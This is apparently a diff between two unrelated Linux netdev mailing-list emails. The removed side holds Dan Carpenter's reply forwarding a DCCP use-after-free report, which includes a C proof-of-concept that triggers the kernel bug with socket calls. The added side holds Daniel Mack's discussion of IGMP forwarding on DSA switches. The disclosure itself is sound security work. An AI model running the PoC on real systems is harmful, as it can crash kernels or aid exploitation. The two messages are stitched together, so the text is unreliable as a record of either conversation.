@@ -2,246 +2,110 @@ Return-Path: <netdev-owner@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
 Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
-	by mail.lfdr.de (Postfix) with ESMTP id 4B24C2025AB
-	for <lists+netdev@lfdr.de>; Sat, 20 Jun 2020 19:35:13 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id B083E2025CA
+	for <lists+netdev@lfdr.de>; Sat, 20 Jun 2020 20:03:26 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1728318AbgFTRfC (ORCPT <rfc822;lists+netdev@lfdr.de>);
-        Sat, 20 Jun 2020 13:35:02 -0400
-Received: from userp2120.oracle.com ([156.151.31.85]:45308 "EHLO
-        userp2120.oracle.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1728126AbgFTRfC (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Sat, 20 Jun 2020 13:35:02 -0400
-Received: from pps.filterd (userp2120.oracle.com [127.0.0.1])
-        by userp2120.oracle.com (8.16.0.42/8.16.0.42) with SMTP id 05KHSxYD024836;
-        Sat, 20 Jun 2020 17:34:47 GMT
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=date : from : to : cc
- : subject : message-id : references : mime-version : content-type :
- content-transfer-encoding : in-reply-to; s=corp-2020-01-29;
- bh=THUMzHGhcAFw+lNiocb/fL5eOvqzR2gXbmGaTwx31ig=;
- b=wMGEE75bU8fRLF+onMiPZgVSvAXeS/vqOIu2WBmF8fVmQU6LBCLh7kuEYdjBBdGi2VGT
- uUYhEShn40nlfF7o91RSAYbChwiUUA7ohIFNV0+G4aSXGqtga56Tv/1FTUW42pqAgmmk
- VXMuAUxwdA+ZcobGt72W08U7aca6x7XAMTA28mNhBNVyJ35kr9m7CWyFEhp4ux4IJlIm
- 2VDk0VqVfyjlEDfpIxFjn8u8JG0EIvqYM1nswqZevAni1SVdycyeNxp7BvuEbAm/2Hsr
- tlFE03/Xy/ZhvK7f0UgW4DQUbKTOmNrj/W0w+/uRpZuYf/ZJwf2bEAApNPYeHHe7KgmB Iw== 
-Received: from userp3020.oracle.com (userp3020.oracle.com [156.151.31.79])
-        by userp2120.oracle.com with ESMTP id 31sebb992x-1
-        (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=FAIL);
-        Sat, 20 Jun 2020 17:34:47 +0000
-Received: from pps.filterd (userp3020.oracle.com [127.0.0.1])
-        by userp3020.oracle.com (8.16.0.42/8.16.0.42) with SMTP id 05KHS9OK073970;
-        Sat, 20 Jun 2020 17:34:47 GMT
-Received: from userv0122.oracle.com (userv0122.oracle.com [156.151.31.75])
-        by userp3020.oracle.com with ESMTP id 31seb6y35u-1
-        (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK);
-        Sat, 20 Jun 2020 17:34:47 +0000
-Received: from abhmp0001.oracle.com (abhmp0001.oracle.com [141.146.116.7])
-        by userv0122.oracle.com (8.14.4/8.14.4) with ESMTP id 05KHYjUA000429;
-        Sat, 20 Jun 2020 17:34:45 GMT
-Received: from kadam (/41.57.98.10)
-        by default (Oracle Beehive Gateway v4.0)
-        with ESMTP ; Sat, 20 Jun 2020 17:34:44 +0000
-Date:   Sat, 20 Jun 2020 20:34:38 +0300
-From:   Dan Carpenter <dan.carpenter@oracle.com>
-To:     Leonardo =?iso-8859-1?Q?Almi=F1ana?= <leonardo@alminana.com.ar>
-Cc:     leonardo.alminana@tacitosecurity.com, security@kernel.org,
-        netdev@vger.kernel.org
-Subject: Re: DCCP Bug report
-Message-ID: <20200620173438.GU4282@kadam>
-References: <CANgvvt4Wi6nFJxufDFEbgW1YPwdV4wXeCgn-yu673D9oRoHJaw@mail.gmail.com>
+        id S1728306AbgFTSBk (ORCPT <rfc822;lists+netdev@lfdr.de>);
+        Sat, 20 Jun 2020 14:01:40 -0400
+Received: from mail.bugwerft.de ([46.23.86.59]:45314 "EHLO mail.bugwerft.de"
+        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
+        id S1728204AbgFTSBk (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Sat, 20 Jun 2020 14:01:40 -0400
+Received: from [192.168.178.106] (pd95efea6.dip0.t-ipconnect.de [217.94.254.166])
+        by mail.bugwerft.de (Postfix) with ESMTPSA id CFEDF42B018;
+        Sat, 20 Jun 2020 18:01:38 +0000 (UTC)
+Subject: Re: Question on DSA switches, IGMP forwarding and switchdev
+To:     Andrew Lunn <andrew@lunn.ch>
+Cc:     Jason Cobham <jcobham@questertangent.com>,
+        "netdev@vger.kernel.org" <netdev@vger.kernel.org>,
+        Ido Schimmel <idosch@idosch.org>,
+        Jiri Pirko <jiri@resnulli.us>,
+        Ivan Vecera <ivecera@redhat.com>,
+        Florian Fainelli <f.fainelli@gmail.com>
+References: <59c5ede2-8b52-c250-7396-fd7b19ec6bc7@zonque.org>
+ <20200619215817.GN279339@lunn.ch>
+ <72f92622c69143b0880125dfe9f9a955@questertangent.com>
+ <20200619223606.GO279339@lunn.ch>
+ <eb6b5f84-2a5a-1938-0657-0eac9f2390df@zonque.org>
+ <20200620143518.GG304147@lunn.ch>
+From:   Daniel Mack <daniel@zonque.org>
+Message-ID: <62c2327e-0094-3369-fc38-7f434324a348@zonque.org>
+Date:   Sat, 20 Jun 2020 20:01:38 +0200
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+ Thunderbird/68.8.0
 MIME-Version: 1.0
-Content-Type: text/plain; charset=iso-8859-1
-Content-Disposition: inline
-Content-Transfer-Encoding: 8bit
-In-Reply-To: <CANgvvt4Wi6nFJxufDFEbgW1YPwdV4wXeCgn-yu673D9oRoHJaw@mail.gmail.com>
-User-Agent: Mutt/1.9.4 (2018-02-28)
-X-Proofpoint-Virus-Version: vendor=nai engine=6000 definitions=9658 signatures=668680
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 phishscore=0 malwarescore=0 spamscore=0
- suspectscore=0 adultscore=0 mlxscore=0 mlxlogscore=999 bulkscore=0
- classifier=spam adjust=0 reason=mlx scancount=1 engine=8.12.0-2004280000
- definitions=main-2006200130
-X-Proofpoint-Virus-Version: vendor=nai engine=6000 definitions=9658 signatures=668680
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0 malwarescore=0 phishscore=0
- adultscore=0 impostorscore=0 cotscore=-2147483648 mlxscore=0
- suspectscore=0 mlxlogscore=999 bulkscore=0 lowpriorityscore=0
- clxscore=1011 priorityscore=1501 classifier=spam adjust=0 reason=mlx
- scancount=1 engine=8.12.0-2004280000 definitions=main-2006200130
+In-Reply-To: <20200620143518.GG304147@lunn.ch>
+Content-Type: text/plain; charset=utf-8
+Content-Language: en-US
+Content-Transfer-Encoding: 7bit
 Sender: netdev-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <netdev.vger.kernel.org>
 X-Mailing-List: netdev@vger.kernel.org
 
-This one is already publicly known because syzbot discovered it last
-November.  I have added netdev to the CC list.  Unfortunately, DCCP
-seems orphaned.
+On 6/20/20 4:35 PM, Andrew Lunn wrote:
+>> So yes, we can read the code here, but I'm wondering which packet types
+>> would then get this flag set, and which won't. Because in case of
+>> IGMP/MLD, the packets are in fact forwarded, but the meaning of the flag
+>> in skb is to prevent the skb from being forwarded further, which seems
+>> wrong in all cases.
+>>
+>> I'm thinking maybe the flag should never be set?
+> 
+> It is a while since i did much with multicast, so please correct me
+> when i'm wrong...
+> 
+> IGMP can use different group addresses as far as i remember.
+> Join/leave uses the group address of interest. But query can use
+> 224.0.0.1 or the group address.
+> 
+> The bridge should learn from joins, either spontaneous or as a reply
+> to a query. When it sees a join, it should add a multicast FDB to the
+> hardware for the group, so traffic is forwarded out that port.
 
-https://lore.kernel.org/lkml/20191121201433.GD617@kadam/
+Yes, except it's the MDB in this case. But the bridge must also forward
+the IGMP queries and reports to other ports, otherwise a cascaded
+multicast router won't see the membership reports and hence won't send
+frames to our switch.
 
-regards,
-dan carpenter
+> So for real multicast traffic, we do want the flag set, the hardware
+> should be doing the forwarding. If we don't set the flag, we end up
+> with duplication when the SW bridge also forwards the multicast
+> traffic.
 
-On Fri, Jun 19, 2020 at 05:59:58PM -0300, Leonardo Almiñana wrote:
-> A similar bug to CVE-2017-8824 has been (RE)introduced in the Linux kernel.
-> 
-> When a DCCP socket connection happens one of the functions called is
-> dccp_hdlr_ccid.
-> 
-> static int dccp_hdlr_ccid(struct sock *sk, u64 ccid, bool rx)
-> {
->     struct dccp_sock *dp = dccp_sk(sk);
->     struct ccid *new_ccid = ccid_new(ccid, sk, rx);
-> 
->     if (new_ccid == NULL)
->         return -ENOMEM;
-> 
->     if (rx) {
->         ccid_hc_rx_delete(dp->dccps_hc_rx_ccid, sk);
->         dp->dccps_hc_rx_ccid = new_ccid;
->     } else {
->         ccid_hc_tx_delete(dp->dccps_hc_tx_ccid, sk);
->         dp->dccps_hc_tx_ccid = new_ccid;
->     }
->     return 0;
-> }
-> 
-> The function allocates a new CCID and assigns it to the sock.
-> * If an old CCID is found then it's deleted.
-> 
-> void ccid_hc_rx_delete(struct ccid *ccid, struct sock *sk)
-> {
->     if (ccid != NULL) {
->         if (ccid->ccid_ops->ccid_hc_rx_exit != NULL)
->             ccid->ccid_ops->ccid_hc_rx_exit(sk);
->         kmem_cache_free(ccid->ccid_ops->ccid_hc_rx_slab, ccid);
->     }
-> }
-> 
-> void ccid_hc_tx_delete(struct ccid *ccid, struct sock *sk)
-> {
->     if (ccid != NULL) {
->         if (ccid->ccid_ops->ccid_hc_tx_exit != NULL)
->             ccid->ccid_ops->ccid_hc_tx_exit(sk);
->         kmem_cache_free(ccid->ccid_ops->ccid_hc_tx_slab, ccid);
->     }
-> }
-> 
-> When the socket is disconnected dccp_disconnect is invoked, this function
-> leaves dp->dccps_hc_tx_ccid unaltered.
-> 
-> It is possible to copy the socket including dangling references. To
-> accomplish
-> it the socket has to be put into LISTEN state.
-> 
-> struct sock *dccp_create_openreq_child(const struct sock *sk,
->                        const struct request_sock *req,
->                        const struct sk_buff *skb)
-> {
->     /*
->     * Step 3: Process LISTEN state
->     *
->     * (* Generate a new socket and switch to that socket *)
->     * Set S := new socket for this port pair
->     */
-> 
->     struct sock *newsk = inet_csk_clone_lock(sk, req, GFP_ATOMIC);
-> 
->     [...]
-> 
->     /*
->     * Activate features: initialise CCIDs, sequence windows etc.
->     */
->     if (dccp_feat_activate_values(newsk, &dreq->dreq_featneg)) {
->         sk_free_unlock_clone(newsk);
->         return NULL;
->     }
-> 
->     [...]
-> }
-> 
-> The call to inet_csk_clone_lock allocates a new socket and
-> the contents of sk are copied to newsk. Next dccp_feat_activate_values gets
-> called, which ends up calling dccp_hdlr_ccid.
-> 
-> Since the copy contains a non-NULL pointer ccid_hc_tx_delete will be called
-> to
-> destroy the CCID object while the source socket is still holding references
-> to
-> it. The UAF can be triggered by operating over the CCIDs from the original
-> sock
-> after the child sock has freed it.
-> 
-> 
-> Original patch that "fixed" CVE-2017-8824:
-> https://github.com/torvalds/linux/commit/69c64866ce072dea1d1e59a0d61e0f66c0dffb76
-> 
-> The patch was broken as it can been seen the following commit:
-> https://github.com/torvalds/linux/commit/67f93df79aeefc3add4e4b31a752600f834236e2
-> 
-> Things were still broken, so ccid_hc_tx_delete was removed :
-> https://github.com/torvalds/linux/commit/2677d20677314101293e6da0094ede7b5526d2b1
-> 
-> The last patch leaves things almost exactly as they were with CVE-2017-8824.
-> The difference is that now only TX is affected, making exploitation harder
-> for
-> the following reasons:
->     - RX's size made it easy to produce kmalloc block collisions, with TX
-> it isn't.
->     - The actual freeing of the object is deferred and might happen in a
-> different
->       context because of RCU.
-> 
-> 
-> Proof of Concept
-> ================
-> 
-> #include <stdio.h>
-> #include <string.h>
-> #include <unistd.h>
-> #include <sys/socket.h>
-> #include <netinet/in.h>
-> 
-> 
-> int main(int argc, char *argv[])
-> {
->     struct sockaddr_in in1 =
->     {
->         .sin_family = AF_INET,
->         .sin_port = 0xaaaa
->     };
-> 
->     struct sockaddr_in in2 =
->     {
->         .sin_family = AF_INET,
->         .sin_port = 0xbbbb
->     };
-> 
->     struct sockaddr_in in3 = { 0 };
-> 
->     int fd1 = socket(PF_INET, SOCK_DCCP, 0);
->     int fd2 = socket(PF_INET, SOCK_DCCP, 0);
-> 
->     bind(fd1, (struct sockaddr*)&in1, sizeof(in1));
->     listen(fd1, 1);
->     connect(fd2, (struct sockaddr*)&in1, sizeof(in1));
->     connect(fd1, (struct sockaddr*)&in3, sizeof(in3));
->     connect(fd2, (struct sockaddr*)&in3, sizeof(in3));
->     bind(fd2, (struct sockaddr*)&in2, sizeof(in2));
->     listen(fd2, 1);
->     connect(fd1, (struct sockaddr*)&in2, sizeof(in2));
->     close(fd1);
->     close(fd2);
-> 
->     return 0;
-> }
-> 
-> ### ### ### ### ### ### ### ### ### ### ### ### ###
-> 
-> Please use my company email for any future communications, I was forced to
-> use this one at the moment because your MTA refuses to accept the email
-> from our provider (zoho) due to a spamcop related issue.
-> 
-> leonardo.alminana@tacitosecurity.com
-> 
-> Regards.
-> 
-> Leonardo Almiñana
-> Tacito Security
+Yes, agreed.
+
+> For IGMP/MLD itself, we probably need to see what the switch does. For
+> IGMP using the group address, does the multicast FDB rule match and
+> cause the hardware to forward the IGMP?
+
+No, because snooping is enabled on all ports of the switch by the
+driver, all IGMP frames are redirected to the CPU port and not egressed
+on any other port, regardless of the entries in the ATU.
+
+> If yes, then we need the flag
+> set, otherwise the IGMP gets duplicated. If no, then we don't want the
+> flag set, and leave the SW bridge to do the forwarding, 
+
+Exactly.
+
+> or reply
+> itself if it is the querier.
+
+If it has memberships itself.
+
+> 6352 uses the EDSA tagger. But the same bits exist in the DSA tag,
+> which the 6390 uses, due to incompatibility reasons. So it would be
+> nice to extend both taggers.
+
+But the tag format seems to be a bit different on EDSA from what you
+described in your other mail. In my datasheet, the code bits are spread
+across octet 2 and 3.
+
+I'll send a patch for EDSA that works for me and solves the problem I
+had, and then leave it to someone with access to the datasheets of
+variants implementing the DSA tagging to replicate and test that.
+
+
+Thanks for your help!
+Daniel
